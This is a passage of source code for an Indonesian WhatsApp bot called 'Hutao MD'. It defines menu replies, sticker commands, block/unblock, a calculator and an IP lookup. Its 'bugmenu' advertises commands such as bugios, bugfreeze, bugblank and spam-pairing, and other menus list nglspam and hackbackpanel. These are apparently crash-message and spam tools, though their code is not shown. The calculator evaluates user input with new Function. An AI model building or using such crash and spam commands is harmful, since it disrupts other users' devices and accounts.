            newsletterJid: '120363357312070270@newsletter',
            serverMessageId: null,
            newsletterName: `${global.namabot}`
        }
    }
}, { quoted: { key: { participant: `${global.owner}@s.whatsapp.net`, remoteJid: `${global.owner}@s.whatsapp.net` }, message: { conversation: `aloo ${pushname}`}}});

cay.sendMessage(m.chat, {audio: fs.readFileSync('./media/mikir.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: fkontak})
}
break
case "domenu":
case "digitaloceanmenu":{
const tek = `*aloo* @${m?.sender.split('@')[0]} 
╭─┈ *⪻ DigitalOceanMenu ≫*┈─⊡
╰◈ ${prefix}listdroplet
╰◈ ${prefix}sisadroplet
╰◈ ${prefix}deldroplet
╰◈ ${prefix}rebuild
╰◈ ${prefix}restartvps
╰◈ ${prefix}sendvps
╰◈ ${prefix}r1c1 - r16c4
┗──≫`
cay.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb4 },
    fileName: `${ucapan()}`,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: tek,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: global.group,
            thumbnailUrl: global.thumb4,
            title: global.namaowner,
            body: global.namabot,
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363357312070270@newsletter',
            serverMessageId: null,
            newsletterName: `${global.namabot}`
        }
    }
}, { quoted: { key: { participant: `${global.owner}@s.whatsapp.net`, remoteJid: `${global.owner}@s.whatsapp.net` }, message: { conversation: `aloo ${pushname}`}}});

cay.sendMessage(m.chat, {audio: fs.readFileSync('./media/mikir.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: fkontak})
}
break
case "photooxymenu":
case "menuphotooxy":{
const tek = `*aloo* @${m?.sender.split('@')[0]} 
╭─┈ *⪻ photoxymenu ≫*┈─⊡
╰◈ ${prefix}.shadow 
╰◈ ${prefix}.write 
╰◈ ${prefix}.romantic 
╰◈ ${prefix}.burnpaper 
╰◈ ${prefix}.smoke 
╰◈ ${prefix}.narutobanner 
╰◈ ${prefix}.love 
╰◈ ${prefix}.undergrass 
╰◈ ${prefix}.doublelove 
╰◈ ${prefix}.coffecup 
╰◈ ${prefix}.underwaterocean 
╰◈ ${prefix}.smokyneon 
╰◈ ${prefix}.starstext 
╰◈ ${prefix}.rainboweffect 
╰◈ ${prefix}.balloontext
╰◈ ${prefix}.metalliceffect
╰◈ ${prefix}.embroidderytext
╰◈ ${prefix}.flamingtext
╰◈ ${prefix}.stonetext
╰◈ ${prefix}.writeart
╰◈ ${prefix}.summertext
╰◈ ${prefix}.wolfmetaltext
╰◈ ${prefix}.nature3dtext
╰◈ ${prefix}.rosestext
╰◈ ${prefix}.naturetypography
╰◈ ${prefix}.quotesunder
╰◈ ${prefix}.shinetext
┗──≫`
cay.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb4 },
    fileName: `${ucapan()}`,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: tek,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: global.group,
            thumbnailUrl: global.thumb4,
            title: global.namaowner,
            body: global.namabot,
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363357312070270@newsletter',
            serverMessageId: null,
            newsletterName: `${global.namabot}`
        }
    }
}, { quoted: { key: { participant: `${global.owner}@s.whatsapp.net`, remoteJid: `${global.owner}@s.whatsapp.net` }, message: { conversation: `aloo ${pushname}`}}});

cay.sendMessage(m.chat, {audio: fs.readFileSync('./media/mikir.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: fkontak})
}
break
case "pushkontakmenu":
case "kontakpush":{
const tek = `*aloo* @${m?.sender.split('@')[0]} 
╭─┈ *⪻ aimenu ≫*┈─⊡
╰◈ ${prefix}cekidgc
╰◈ ${prefix}listgroup
╰◈ ${prefix}pushkontakv1
╰◈ ${prefix}pushkontakv2
╰◈ ${prefix}pushkontakv3
╰◈ ${prefix}pushkontakv4
╰◈ ${prefix}savecontactv1 
╰◈ ${prefix}savecontactv2
╰◈ ${prefix}getcontact
╰◈ ${prefix}sendkontak
╰◈ ${prefix}jpm
╰◈ ${prefix}bcgc`
cay.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb4 },
    fileName: `${ucapan()}`,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: tek,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: global.group,
            thumbnailUrl: global.thumb4,
            title: global.namaowner,
            body: global.namabot,
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363357312070270@newsletter',
            serverMessageId: null,
            newsletterName: `${global.namabot}`
        }
    }
}, { quoted: { key: { participant: `${global.owner}@s.whatsapp.net`, remoteJid: `${global.owner}@s.whatsapp.net` }, message: { conversation: `aloo ${pushname}`}}});

cay.sendMessage(m.chat, {audio: fs.readFileSync('./media/baa.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: fkontak})
}
break
/*case "aimenu":{
let menu = `
┏ ⪻ 𝐀𝐢 𝐌𝐞𝐧𝐮 ≫
╰◈ ${prefix}turbo
╰◈ ${prefix}txt2img
╰◈ ${prefix}morphic
╰◈ ${prefix}aio2
╰◈ ${prefix}hutao
╰◈ ${prefix}hutao-chat
╰◈ ${prefix}gpt4
╰◈ ${prefix}autoai ( Character-AI )
┗──≫
`
cay.sendMessage(m.chat, {
text: menu,
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender],
forwardedNewsletterMessageInfo: {
newsletterName: namabot,
newsletterJid: idsaluran,
},
externalAdReply: {
title: namabot,
body: namaowner,
thumbnailUrl: thumb,
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: false
}}}, {quoted:m})
}
break*/
case "voice":
case "voicemenu":{
const tek = `*aloo* @${m?.sender.split('@')[0]} 
╭─┈ *⪻ aimenu ≫*┈─⊡
╰◈ ${prefix}bass
╰◈ ${prefix}blown
╰◈ ${prefix}deep
╰◈ ${prefix}earrape
╰◈ ${prefix}fast
╰◈ ${prefix}fat
╰◈ ${prefix}nightcore
╰◈ ${prefix}reverse
╰◈ ${prefix}robot
╰◈ ${prefix}slow
╰◈ ${prefix}smooth
╰◈ ${prefix}tupai
╰◈ ${prefix}smooth
┗──≫`
cay.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb4 },
    fileName: `${ucapan()}`,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: tek,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: global.group,
            thumbnailUrl: global.thumb4,
            title: global.namaowner,
            body: global.namabot,
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363357312070270@newsletter',
            serverMessageId: null,
            newsletterName: `${global.namabot}`
        }
    }
}, { quoted: { key: { participant: `${global.owner}@s.whatsapp.net`, remoteJid: `${global.owner}@s.whatsapp.net` }, message: { conversation: `aloo ${pushname}`}}});

cay.sendMessage(m.chat, {audio: fs.readFileSync('./media/mikir.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: fkontak})
}
break
case "ownermenu":
case "menuowner":{
const tek = `*aloo* @${m?.sender.split('@')[0]} 
╭─┈ *⪻ menu owner ≫*┈─⊡
┏ ⪻ 𝐎𝐰𝐧 𝐌𝐞𝐧𝐮 ≫
╰◈ ${prefix}block
╰◈ ${prefix}unblock
╰◈ ${prefix}upch
╰◈ ${prefix}cekidch
╰◈ ${prefix}idgc
╰◈ ${prefix}out
╰◈ ${prefix}out2
╰◈ ${prefix}addscrape
╰◈ ${prefix}addprem
╰◈ ${prefix}delprem
╰◈ ${prefix}allprem
╰◈ ${prefix}addseller
╰◈ ${prefix}delseller
╰◈ ${prefix}addowner
╰◈ ${prefix}addfile2
╰◈ ${prefix}autoread
╰◈ ${prefix}getcase
╰◈ ${prefix}addcase 
╰◈ ${prefix}delcase
╰◈ ${prefix}plerr
╰◈ ${prefix}setppbot
┗──≫`
cay.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb4 },
    fileName: `${ucapan()}`,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: tek,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: global.group,
            thumbnailUrl: global.thumb,
            title: global.namaowner,
            body: global.namabot,
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363357312070270@newsletter',
            serverMessageId: null,
            newsletterName: `${global.namabot}`
        }
    }
}, { quoted: { key: { participant: `${global.owner}@s.whatsapp.net`, remoteJid: `${global.owner}@s.whatsapp.net` }, message: { conversation: `aloo ${pushname}`}}});

cay.sendMessage(m.chat, {audio: fs.readFileSync('./media/starboy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
//BugMenu
 case "bugmenu": {
        const text12 = `
${ucapan()}
╭─┈ *⪻ BUGMENU ≫*┈─⊡
┏ ⪻ BUGMENU ≫
╰◈ ${prefix}bugcaywzz
╰◈ ${prefix}xc *TYPE-SELECT*
╰◈ ${prefix}spam-pairing
╰◈ ${prefix}bugui
╰◈ ${prefix}bugdoku
╰◈ ${prefix}bugspam
╰◈ ${prefix}deletebug
╰◈ ${prefix}bugios
╰◈ ${prefix}bugiosinvis
╰◈ ${prefix}bug3
╰◈ ${prefix}bugfreeze
╰◈ ${prefix}bugblank 
 
┗──≫`
        await cay.sendMessage(m.chat, {
          react: {
            text: '⏳',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '3️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '2️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '1️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '☑️',
            key: m.key,
          }
        });
        cay.sendMessage(m.chat, {
          video: fs.readFileSync('./media/hutaomenu.mp4'),
          gifPlayback: true,

          caption: text12,
          contextInfo: {
            externalAdReply: {
              title: 'H U T A O M D V 1.9',
              body: 'Creator : Caywzz',
              thumbnailUrl: 'https://files.catbox.moe/ggzetx.jpg',
              sourceUrl: `https://t.me/caywzz`,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: m
        })
        }
        break
        
        
 case "menujava": {
        const text12 = `
${ucapan()}
╭─┈ *⪻ encrypt ≫*┈─⊡
┏ ⪻ Encrypt ≫
╰◈ ${prefix}dec doc
╰◈ ${prefix}enc
┗──≫`
        await cay.sendMessage(m.chat, {
          react: {
            text: '⏳',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '3️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '2️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '1️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '☑️',
            key: m.key,
          }
        });
        cay.sendMessage(m.chat, {
          video: fs.readFileSync('./media/hutaomenu.mp4'),
          gifPlayback: true,

          caption: text12,
          contextInfo: {
            externalAdReply: {
              title: 'H U T A O M D V 1.9',
              body: 'Creator : Caywzz',
              thumbnailUrl: 'https://files.catbox.moe/ggzetx.jpg',
              sourceUrl: `https://t.me/caywzz`,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: m
        })
      }
        break
 case "vpsmenu": {
        const text12 = `
${ucapan()}
╭─┈ *⪻ Vps Menu ≫*┈─⊡
┏ ⪻ VPS MENU ≫
╰◈ ${prefix}.subdomain(Khusus Sc BUYER)
╰◈ ${prefix}.uninstallpanel
╰◈ ${prefix}.installpanel
╰◈ ${prefix}.installtemastellar
╰◈ ${prefix}.installtemabilling
╰◈ ${prefix}.installtemaenigma
╰◈ ${prefix}.startwings
╰◈ ${prefix}.domains
╰◈ ${prefix}.hackbackpanel
╰◈ ${prefix}© Caywzz
┗──≫`
        await cay.sendMessage(m.chat, {
          react: {
            text: '⏳',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '3️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '2️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '1️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '☑️',
            key: m.key,
          }
        });
        cay.sendMessage(m.chat, {
          video: fs.readFileSync('./media/hutaomenu.mp4'),
          gifPlayback: true,

          caption: text12,
          contextInfo: {
            externalAdReply: {
              title: 'H U T A O M D V 1.9',
              body: 'Creator : Caywzz',
              thumbnailUrl: 'https://files.catbox.moe/ggzetx.jpg',
              sourceUrl: `https://t.me/caywzz`,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: m
        })
      }
        break
        
//STIKER MENU
case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkiss': {
axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickspank':{
                axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticktickle':{
                axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
cay.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break

 case "panelmenu": {
        const text12 = `
${ucapan()}
╭─┈ *⪻ panelmenu ≫*┈─⊡
┏ ⪻ panelmenu ≫
╰◈ ${prefix}.addseller
╰◈ ${prefix}.delseller
╰◈ ${prefix}.listseller
╰◈ ${prefix}.addadmin
╰◈ ${prefix}.addadmin2
╰◈ ${prefix}.cpanel
╰◈ ${prefix}.cpanel2
╰◈ ${prefix}.cpanel3
╰◈ ${prefix}.listpanel
╰◈ ${prefix}.listadmin
╰◈ ${prefix}.deladmin
╰◈ ${prefix}.delpanel
┗──≫`
        await cay.sendMessage(m.chat, {
          react: {
            text: '⏳',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '3️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '2️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '1️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '☑️',
            key: m.key,
          }
        });
        cay.sendMessage(m.chat, {
          video: fs.readFileSync('./media/hutaomenu.mp4'),
          gifPlayback: true,

          caption: text12,
          contextInfo: {
            externalAdReply: {
              title: 'H U T A O M D V 1.9',
              body: 'Creator : Caywzz',
              thumbnailUrl: 'https://files.catbox.moe/ggzetx.jpg',
              sourceUrl: `https://t.me/caywzz`,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: m
        })
      }
        break
        /*case "ownermenu":{
let menu = `
┏ ⪻ 𝐎𝐰𝐧 𝐌𝐞𝐧𝐮 ≫
╰◈ ${prefix}block
╰◈ ${prefix}unblock
╰◈ ${prefix}upch
╰◈ ${prefix}addfile2
╰◈ ${prefix}autoread
╰◈ ${prefix}getcase
╰◈ ${prefix}addcase 
╰◈ ${prefix}plerr
╰◈ ${prefix}setppbot
┗──≫©
`
cay.sendMessage(m.chat, {
text: menu,
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender],
forwardedNewsletterMessageInfo: {
newsletterName: namabot,
newsletterJid: idsaluran,
},
externalAdReply: {
title: namabot,
body: namaowner,
thumbnailUrl: thumb,
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: false
}}}, {quoted:m})
}
break*/
case "kalkulator":{
 val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* = _${result}_`)
} catch (e) {
if (e == undefined) return reply('Isinya?')
reply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
}
break
case "Toolsmenu": {
        const text12 = `
${ucapan()}
╭─┈ *⪻ ToolsMenu ≫*┈─⊡
┏ ⪻ 𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮 ≫
╰◈ ${prefix}remini/hd
╰◈ ${prefix}faketweet
╰◈ ${prefix}kalkulator 
╰◈ ${prefix}nglspam
╰◈ ${prefix}tr
╰◈ ${prefix}jadianime
╰◈ ${prefix}ceknik
╰◈ ${prefix}trackip
╰◈ ${prefix}spam-pairing
╰◈ ${prefix}get
┗──≫`
        await cay.sendMessage(m.chat, {
          react: {
            text: '⏳',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '3️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '2️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '1️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '☑️',
            key: m.key,
          }
        });
        cay.sendMessage(m.chat, {
          video: fs.readFileSync('./media/hutaomenu.mp4'),
          gifPlayback: true,

          caption: text12,
          contextInfo: {
            externalAdReply: {
              title: 'H U T A O M D V 1.9',
              body: 'Creator : Caywzz',
              thumbnailUrl: 'https://files.catbox.moe/ggzetx.jpg',
              sourceUrl: `https://t.me/caywzz`,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: m
        })
      }
        break
       case "groupmenu": {
        const text12 = `
${ucapan()}
╭─┈ *⪻ groupmenu ≫*┈─⊡
┏ ⪻ 𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮 ≫
╰◈ ${prefix}welcome
╰◈ ${prefix}antilink2
╰◈ ${prefix}antilink
╰◈ ${prefix}statusgc
╰◈ ${prefix}hidetag
╰◈ ${prefix}kick
╰◈ ${prefix}delete
╰◈ ${prefix}demote
╰◈ ${prefix}promote
╰◈ ${prefix}open
╰◈ ${prefix}close 
╰◈ ${prefix}kickall
┗──≫`
        await cay.sendMessage(m.chat, {
          react: {
            text: '⏳',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '3️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '2️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '1️⃣',
            key: m.key,
          }
        })
        await cay.sendMessage(m.chat, {
          react: {
            text: '☑️',
            key: m.key,
          }
        });
        cay.sendMessage(m.chat, {
          video: fs.readFileSync('./media/hutaomenu.mp4'),
          gifPlayback: true,

          caption: text12,
          contextInfo: {
            externalAdReply: {
              title: 'H U T A O M D V 1.9',
              body: 'Creator : Caywzz',
              thumbnailUrl: 'https://files.catbox.moe/ggzetx.jpg',
              sourceUrl: `https://t.me/caywzz`,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: m
        })
      }
        break

    case 'readchange': case 'autoread':{
if (!isCreator) return 
if (args.length < 1) return reply(`Contoh ${prefix + command} on/off`)
if (q === 'on') {
global.autoread = true
reply(`Berhasil mengubah autoread ke ${q}`)
} else if (q === 'off') {
global.autoread = false
m.reply(`Berhasil mengubah autoread ke ${q}`)
}
    }
        break
case 'block':
if (!isCreator) return reply(msg.owner);
if(isGroup){
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if(users){
await cay.updateBlockStatus(users, "block")
reply(`Sukses block user`)
} else {
reply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return m.reply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return m.reply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await cay.updateBlockStatus(woke, "block")
} else if(!q){
reply("Masukan nomer yang ingin di block")
}
reply(`Berhasil Block user ${woke.split("@")[0]}`)
}
break
case 'unblock':
if (!isCreator) return reply(msg.owner);
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if(isGroup){
if(users){
await cay.updateBlockStatus(users, "unblock")
await m.reply(`Sukses unblock user`)
} else if(!q){
m.reply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return m.reply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return m.reply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await cay.updateBlockStatus(woke, "unblock")
reply(`Sukses unblock ${woke}`)
} else if(!q){
reply("Masukan nomer yang ingin di unblock")
}

}
break
case 'setppbot':{
if (!isCreator) return m.reply(msg.owner);
if(m.quoted){
const media = await cay.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await cay.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})   
await m.reply(`Done`)
} else m.reply("Reply fotonya")
}
break

case 'trackip':
{
if (!text) return m.reply(`*Example:* ${prefix + command} 112.90.150.204`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
